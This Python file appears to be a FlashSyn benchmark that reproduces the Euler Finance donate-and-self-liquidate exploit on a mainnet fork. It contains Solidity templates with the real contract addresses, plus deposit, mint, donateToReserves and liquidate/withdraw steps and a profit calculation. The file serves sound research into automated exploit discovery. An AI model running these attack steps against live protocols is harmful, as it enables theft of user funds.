import sys
import os
import config

SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
sys.path.append(os.path.dirname(SCRIPT_DIR))
sys.path.append(os.path.dirname(os.path.dirname(SCRIPT_DIR)))

from Actions.macros import *
from Actions.Utils import *
from Actions.UtilsPrecision import *
from Actions.Action import *
from Actions.AttackDAG import *
from FlashSynProActions.ActionPro import *
from synthesizer import *


class eulerAction(ActionPro):
    # This is a vector of global states  
    initialBalances = {"USDC": 400000000}  # TODO: initial capital, need to be consistent with the foundry script
    ## initial balances of the attacker
    # initially the attacker has 400000000 USDC

    currentBalances = initialBalances.copy()  # Don't change

    # Used to calculate the profit = (weighted sum of final balances - 
    # ETH is the only token of interest
    TokenPrices = {"USDC": 1.0}    # TODO: token prices at the specific block

    TargetTokens = TokenPrices.keys()    # Don't change: token of interest



    # TODO: 
    # It is the start of the foundry script above all testExample_ functions
    start_str = '''// SPDX-License-Identifier: MIT
pragma solidity >0.4.21;

// exploit: https://phalcon.xyz/tx/eth/0x465a6780145f1efe3ab52f94c006065575712d2003d83d85481f3d110ed131d9

import {DSTest} from "ds-test/test.sol";
import {Utilities} from "./utils/Utilities.sol";
import {console} from "./utils/Console.sol";
import {Vm} from "forge-std/Vm.sol";
import {stdCheats} from "forge-std/stdlib.sol";
import {Strings} from "mylib/StringCon.sol";
import "ds-test/test.sol";



interface IUSDC {
    function approve(address spender, uint256 value) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function burn(uint256 _amount) external;
    function configureMinter(address minter, uint256 minterAllowedAmount) external returns (bool);
    function decimals() external view returns (uint8);
    function masterMinter() external view returns (address);
    function mint(address _to, uint256 _amount) external returns (bool);
    function transfer(address to, uint256 value) external returns (bool);
}

interface IEToken {
    function burn(uint256 subAccountId, uint256 amount) external;
    function deposit(uint256 subAccountId, uint256 amount) external;
    function balanceOf(address account) external view returns (uint256);
    function donateToReserves(uint256 subAccountId, uint256 amount) external;
    function mint(uint256 subAccountId, uint256 amount) external;
    function touch() external;
    function withdraw(uint256 subAccountId, uint256 amount) external;
}

interface IEulerProtocol {
    function dispatch() external;
    function moduleIdToImplementation(uint256 moduleId) external view returns (address);
    function moduleIdToProxy(uint256 moduleId) external view returns (address);
    function name() external view returns (string memory);
}

interface IDToken {
    function balanceOf(address account) external view returns (uint256);
}


interface ILiquidation {
    function checkLiquidation(address liquidator, address violator, address underlying, address collateral)
        external
        returns (LiquidationOpportunity memory liqOpp);
    function liquidate(address violator, address underlying, address collateral, uint256 repay, uint256 minYield)
        external;
}

struct LiquidationOpportunity {
    uint256 repay;
    uint256 yield;
    uint256 healthScore;
    // Only populated if repay > 0:
    uint256 baseDiscount;
    uint256 discount;
    uint256 conversionRate;
}

contract euler is DSTest, stdCheats {
    Vm internal constant vm = Vm(HEVM_ADDRESS);
    address payable constant attacker = payable(address(uint160(uint256(keccak256(abi.encodePacked("attacker"))))));
    address payable constant attacker2 = payable(address(uint160(uint256(keccak256(abi.encodePacked("attacker2"))))));
    IUSDC internal constant USDC = IUSDC(address(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48));
    IEToken internal constant EToken = IEToken(address(0xbb0D4bb654a21054aF95456a3B29c63e8D1F4c0a));
    IEulerProtocol internal constant EulerProtocol = IEulerProtocol(address(0x27182842E098f60e3D576794A5bFFb0777E025d3));
    IEToken internal constant eUSDC = IEToken(address(0xEb91861f8A4e1C12333F42DCE8fB0Ecdc28dA716));
    IDToken internal constant dUSDC = IDToken(address(0x84721A3dB22EB852233AEAE74f9bC8477F8bcc42));
    ILiquidation internal constant Liquidation = ILiquidation(address(0xf43ce1d09050BAfd6980dD43Cde2aB9F18C85b34));
    uint256 repay; uint256 yield;
    LiquidationOpportunity temp;
    
    function setUp() public {
        vm.label(attacker, "Attacker");
        address MasterMinter = USDC.masterMinter();
        vm.startPrank(MasterMinter);
        USDC.configureMinter(address(0x9BEF5148fD530244a14830f4984f2B76BCa0dC58), 2 ** 256 - 1);
        vm.stopPrank();
        startHoax(address(0x9BEF5148fD530244a14830f4984f2B76BCa0dC58));
        USDC.mint(address(attacker), 400000000e6);
        vm.stopPrank();

        // start to
        vm.startPrank(attacker);
        
        USDC.approve(address(EulerProtocol), type(uint256).max);
    }

    function profitSummary() public view returns (string memory) {
        string memory profitSummaryString = Strings.append("FlashSyn USDC balance: ", USDC.balanceOf(address(attacker)) / 1e6);
        return profitSummaryString;
    }
    '''



    # TODO: how can we use return value of profitSummary() of Foundry to calculate profit?
    def calcProfit(stats): 
        if stats == None:
            return 0
        # We choose to calculate profit here because it's hard to handle 
        # integer subtraction in the Solidity.
        USDC_earned = stats[0] - eulerAction.initialBalances['USDC']
        return USDC_earned


    # in most cases, we don't need to change this function
    # however, we might want to try different TargetDataPoints and maxLen
    @classmethod
    def initialPass(cls, actionList, actionDependencies, ActionWrapper, maxLen = None):
        if maxLen == None:
            largestLen = 0
            for actionDependency in actionDependencies:
                if len(actionDependency) > largestLen:
                    largestLen = len(actionDependency)
            maxLen = largestLen

        action_list_1 = actionList
        # seq of actions
        actionSpecs = []
        for ii in range(len(actionDependencies)):
            temp = actionDependencies[ii] + [actionList[ii]] 
            actionSpecs.append( temp )
        start = time.time()
        initialPassCollectData4( actionSpecs , ActionWrapper, TargetDataPoints = 500, maxLenGlobal = maxLen)
        ShowDataPointsForEachAction( action_list_1 )
        end = time.time()
        print("in total it takes %f seconds" % (end - start))



    # TODO. 
    # After executing initialPass(), paste the data points printed to this function.
    @classmethod
    def runinitialPass(cls):
        # Build one approximator per terminal action from the collected data.
        # The action sequence comes from each file's saved payload (names), and
        # classes are resolved via the registry (cls.action_by_name) — not by
        # splitting the pkl filename on "_" or looking names up in globals().
        map = loadDataPoints()
        helpMap = {}
        for key in map.keys():
            payload = map[key]
            if len(payload) < 3:
                sys.exit("stale data file '{}.pkl' (pre-registry format); "
                         "re-run data collection".format(key))
            points, values, names = payload[0], payload[1], payload[2]
            actionStr = names[-1]
            actionList = [cls.action_by_name(n) for n in names]
            if len(points) > 0:
                helpMap.setdefault(actionStr, {})[key] = (actionList, [points, values])
        for actionStr in helpMap.keys():
            approx = NumericalApproximatorsPro(helpMap[actionStr])
            target = cls.action_by_name(actionStr)
            target.approximators = approx
            target.approximators.refreshTransitFormula()


class eulerDeposit(eulerAction):
    approximators = NumericalApproximatorsPro()

    # TODO
    numInputs = 1        # num of parameters undetermined
    tokensIn = ['USDC']    # the token taken from the attacker
    tokensOut = ['eUSDC']    # the token given to the attacker
    range = [0, 200000000]     # a range of parameters we would like FlashSyn to try


    # TODO
    # part of foundry script used to execute the action
    @classmethod
    def actionStr(cls):
        action = '''        // Action: deposit
        eUSDC.deposit(0, $$ * 1e6);
        '''
        return action

    # TODO
    # part of foundry script used to collect data points for the action
    @classmethod
    def collectorStr(cls):
        action = '''        // Collect  Deposit: USDC --> eUSDC  State: eUSDCBalance
        //        State: eUSDCBalance
        uint eUSDCGot = eUSDC.balanceOf(address(attacker));
        eUSDC.deposit(0, $$ * 1e6);
        eUSDCGot = eUSDC.balanceOf(address(attacker)) - eUSDCGot;
        revert(Strings.append( "FlashSyn: ", eUSDCGot / 1e18 ) );
        '''
        cls.collectorNumSize = 1
        return action


    # TODO
    # How are we gonna use the output of the approximator?
    # We need to update the global states and change user balances
    @classmethod
    def transit(cls, inputs, actionList):
        cls.currentBalances["USDC"] -= inputs[-1]
        output0 = cls.simulate(inputs, actionList)[0]
        if "eUSDC" not in cls.currentBalances:
            cls.currentBalances["eUSDC"] = 0
        cls.currentBalances["eUSDC"] += output0
        return 


class eulerMint(eulerAction):
    approximators = NumericalApproximatorsPro()
    # TODO
    numInputs = 1     # num of parameters undetermined
    tokensIn = ['eUSDC']    # the token taken from the attacker
    tokensOut = ['eUSDC', 'dUSDC']   # the token given to the attacker
    range = [0, 2000000000]    # a range of parameters we would like FlashSyn to try
    # TODO
    # part of foundry script used to execute the action
    @classmethod
    def actionStr(cls):
        action = '''      // Action2: eUSDC mint:    --> eUSDC, dUSDC
        eUSDC.mint(0, $$ * 1e6);\n'''
        return action

    # TODO
    # part of foundry script used to collect data points for the action
    @classmethod
    def collectorStr(cls):
        action = '''        // Collect: mint
        uint eUSDCGot = eUSDC.balanceOf(address(attacker));
        eUSDC.mint(0, $$ * 1e6);
        eUSDCGot = eUSDC.balanceOf(address(attacker)) - eUSDCGot;
        revert( Strings.append("FlashSyn: ", eUSDCGot / 1e18 ) );
        '''
        return action


    # TODO
    # How are we gonna use the output of the approximator?
    # We need to update the global states and change user balances
    @classmethod
    def transit(cls, inputs, actionList):
        if "dUSDC" not in cls.currentBalances:
            cls.currentBalances["dUSDC"] = 0
        cls.currentBalances["dUSDC"] += inputs[-1]
        output0 = cls.simulate(inputs, actionList)[0]
        if "eUSDC" not in cls.currentBalances:
            cls.currentBalances["eUSDC"] = 0
        cls.currentBalances["eUSDC"] += output0
        return 


class eulerLiquidateWithdraw(eulerAction):
    # one approximator for one value
    approximators = NumericalApproximatorsPro()

    # TODO
    numInputs = 0     # num of parameters undetermined
    tokensIn = ['dUSDC', 'eUSDC']    # the token taken from the attacker
    tokensOut = ['USDC']   # the token given to the attacker


    # TODO
    # part of foundry script used to execute the action
    @classmethod
    def actionStr(cls):
        action = '''      // Action: eUSDC LiquidateWithdraw
        vm.stopPrank();
        vm.startPrank(attacker2);
        temp = Liquidation.checkLiquidation(address(attacker2), address(attacker), address(USDC), address(USDC));
        repay = temp.repay;
        yield = temp.yield;
        Liquidation.liquidate(address(attacker), address(USDC), address(USDC), repay, yield);
        eUSDC.burn(0, type(uint).max);
        eUSDC.withdraw(0, type(uint).max);
        USDC.transfer(address(attacker), USDC.balanceOf(address(attacker2)));
        vm.stopPrank();
        vm.startPrank(attacker);
        '''
        return action

    # TODO
    # part of foundry script used to collect data points for the action
    @classmethod
    def collectorStr(cls):
        action = '''// Collect: eUSDC LiquidateWithdraw
        uint USDCgot = USDC.balanceOf(address(attacker));
        vm.stopPrank();
        vm.startPrank(attacker2);
        temp = Liquidation.checkLiquidation(address(attacker2), address(attacker), address(USDC), address(USDC));
        repay = temp.repay;
        yield = temp.yield;
        Liquidation.liquidate(address(attacker), address(USDC), address(USDC), repay, yield);
        eUSDC.burn(0, type(uint).max);
        eUSDC.withdraw(0, type(uint).max);
        USDC.transfer(address(attacker), USDC.balanceOf(address(attacker2)));
        vm.stopPrank();
        vm.startPrank(attacker);
        USDCgot = USDC.balanceOf(address(attacker)) - USDCgot;
        revert(Strings.append("FlashSyn: ", USDCgot / 1e6 ));
        '''
        return action


    # TODO
    # How are we gonna use the output of the approximator?
    # We need to update the global states and change user balances
    @classmethod
    def transit(cls, inputs, actionList):
        output0  = cls.simulate(inputs, actionList)[0]
        cls.currentBalances["dUSDC"] = 0
        cls.currentBalances["eUSDC"] = 0
        cls.currentBalances["USDC"] += output0
        return 


class eulerDonate(eulerAction):
    # one approximator for one value
    approximators = NumericalApproximatorsPro()

    # TODO
    numInputs = 1     # num of parameters undetermined
    tokensIn = ['eUSDC']    # the token taken from the attacker
    tokensOut = []   # the token given to the attacker
    range = [0, 2000000000]    # a range of parameters we would like FlashSyn to try

    # TODO
    # part of foundry script used to execute the action
    @classmethod
    def actionStr(cls):
        action = '''      // Action2: eUSDC donate
        eUSDC.donateToReserves(0, $$ * 1e18);
        '''
        return action

    # TODO
    # part of foundry script used to collect data points for the action
    @classmethod
    def collectorStr(cls):
        action = '''        // Collect: eUSDC donate
        uint eUSDCTaken = eUSDC.balanceOf(address(attacker));
        eUSDC.donateToReserves(0, $$ * 1e18);
        eUSDCTaken = eUSDCTaken - eUSDC.balanceOf(address(attacker)) ;
        revert(Strings.append("FlashSyn: ",  eUSDCTaken / 1e18 ) );
        '''
        return action




    # TODO
    # How are we gonna use the output of the approximator?
    # We need to update the global states and change user balances
    @classmethod
    def transit(cls, inputs, actionList):
        output0 = cls.simulate(inputs, actionList)[0]
        cls.currentBalances["eUSDC"] -= output0
        return 


class eulerBurn(eulerAction):
    # one approximator for one value
    approximators = NumericalApproximatorsPro()

    # TODO
    numInputs = 1     # num of parameters undetermined
    tokensIn = ['eUSDC', 'dUSDC']    # the token taken from the attacker
    tokensOut = []   # the token given to the attacker
    range = [0, 200000]    # a range of parameters we would like FlashSyn to try

    # TODO
    # part of foundry script used to execute the action
    @classmethod
    def actionStr(cls):
        action = '''      // Action2: eUSDC donate
        eUSDC.burn(0, $$ * 1e18);
        '''
        return action

    # TODO
    # part of foundry script used to collect data points for the action
    @classmethod
    def collectorStr(cls):
        action = '''        // Collect: eUSDC donate
        uint eUSDCTaken = eUSDC.balanceOf(address(attacker));
        uint dUSDCTaken = dUSDC.balanceOf(address(attacker));
        eUSDC.burn(0, $$ * 1e18);
        eUSDCTaken = eUSDCTaken - eUSDC.balanceOf(address(attacker)) ;
        dUSDCTaken = dUSDCTaken - dUSDC.balanceOf(address(attacker));
        revert(Strings.append("FlashSyn: ",  Strings.appendWithSpace( eUSDCTaken / 1e18,  dUSDCTaken / 1e6 ) ) );
        '''

        return action



    # TODO
    # How are we gonna use the output of the approximator?
    # We need to update the global states and change user balances
    @classmethod
    def transit(cls, inputs, actionList):
        vec = cls.simulate(inputs, actionList)
        output0 = vec[0]
        output1 = vec[1]
        cls.currentBalances["eUSDC"] -= output0
        cls.currentBalances["dUSDC"] -= output1
        return 


class eulerTouch(eulerAction):
    # one approximator for one value
    approximators = NumericalApproximatorsPro()

    # TODO
    numInputs = 0     # num of parameters undetermined
    tokensIn = []    # the token taken from the attacker
    tokensOut = []   # the token given to the attacker
    range = []    # a range of parameters we would like FlashSyn to try

    # TODO
    # part of foundry script used to execute the action
    @classmethod
    def actionStr(cls):
        action = '''      // Action2: eUSDC touch
        eUSDC.touch();
        '''
        return action

    # TODO
    # How are we gonna use the output of the approximator?
    # We need to update the global states and change user balances
    @classmethod
    def transit(cls, inputs, actionList):
        pass





def main():
    # Do not change. 
    config.ExecutionMode = DVD  # DVD for normal cases.

    config.command = "./run.sh euler ETH 16818064"  # the command used by the foundry to run the contract
    config.benchmarkName = "euler"  # the name of the benchmark, simply for distinguishing between different benchmarks

    # ===========================================================================================================
    # =========================== run dependencyCheck.py to get the following information =====================
    # ===========================================================================================================

    action1 = eulerDeposit
    action2 = eulerBurn
    action3 = eulerTouch
    action4 = eulerDonate
    action5 = eulerMint
    action6 = eulerLiquidateWithdraw

    action_list = [action1, action2, action3, action4, action5, action6]

    # prestate_dependency means executing the actions inside the actionX_prestate_dependency vector 
    # will alter the prestates of actionX. It is used to reach a wider range of data points
    # If you are unsure about the prestates, just list all actions inside the actionX_prestate_dependency
    action1_prestate_dependency = [action2, action3, action4, action5, action6] + [action1]
    action2_prestate_dependency = [action1, action3, action4, action5, action6] + [action2]
    action3_prestate_dependency = [action1, action2, action4, action5, action6] + [action3]
    action4_prestate_dependency = [action1, action2, action3, action5, action6] + [action4]
    action5_prestate_dependency = [action1, action2, action3, action4, action6] + [action5]
    action6_prestate_dependency = [action1, action2, action3, action4, action5] + [action6]

    actionDependencies = [action1_prestate_dependency, action2_prestate_dependency, \
                          action3_prestate_dependency, action4_prestate_dependency, \
                          action5_prestate_dependency, action6_prestate_dependency]

    actionDependency = generateActionDependency(action_list, actionDependencies)

    AttackDAGGenerator.setActionDependency(actionDependency)


    # ===========================================================================================================
    # =========================== Set up execution parameters ===================================================
    # ===========================================================================================================


    ActionWrapper = eulerAction
    ActionWrapper.initialPass(action_list, actionDependencies, ActionWrapper)


    # CounterExampleLoop = True
    # Pruning = True
    # maxSynthesisLen = 6  

    # ActionWrapper.runinitialPass()
    # config.benchmarkName = "euler"
    # config.processNum = 1

    # Synthesizer = synthesizer(action_list, eulerAction, config.processNum)
    # Synthesizer.synthesis(maxSynthesisLen, Pruning, CounterExampleLoop)



if __name__ == "__main__":
    main()

